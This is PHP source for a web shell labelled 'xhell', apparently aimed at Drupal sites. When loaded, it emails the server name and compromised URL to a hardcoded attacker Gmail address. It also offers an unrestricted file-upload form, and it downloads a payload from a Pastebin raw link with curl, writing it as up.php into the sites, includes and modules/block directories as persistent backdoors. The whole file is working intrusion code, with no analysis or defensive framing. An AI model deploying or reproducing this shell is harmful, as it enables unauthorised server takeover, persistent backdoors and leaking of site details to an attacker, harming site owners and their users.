<center>
<h5>xhell</h5>
<p><?php echo '<b>'.php_uname().'</b>'; ?></p>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
$system =@php_uname();
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'yakuzahn2@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "$$ Drupal Menggila $$" . "$x_path";
mail($tujuanmail, $system , $pesan_alert,"[ " . $_SERVER['SERVER_NAME'] . " ]");
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="1337" type="submit" id="1337" value="Upload"></form>';
if( $_POST['1337'] == "Upload" ) {
        if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Sukses cok!</b><br><br>'; }
        else { echo '<b>Gagal cok!</b><br><br>'; }
}
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check1 = $_SERVER['DOCUMENT_ROOT'] . "/sites/up.php" ;
$text1 = http_get('https://pastebin.com/raw/u5vP8PyY');
$open1 = fopen($check1, 'w');
fwrite($open1, $text1);
fclose($open1);
if(file_exists($check1)){
}
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/includes/up.php" ;
$text2 = http_get('https://pastebin.com/raw/u5vP8PyY');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
}
$check3 = $_SERVER['DOCUMENT_ROOT'] . "/modules/block/up.php" ;
$text3 = http_get('https://pastebin.com/raw/u5vP8PyY');
$open3 = fopen($check3, 'w');
fwrite($open3, $text3);
fclose($open3);
if(file_exists($check3)){
}
?>
</center>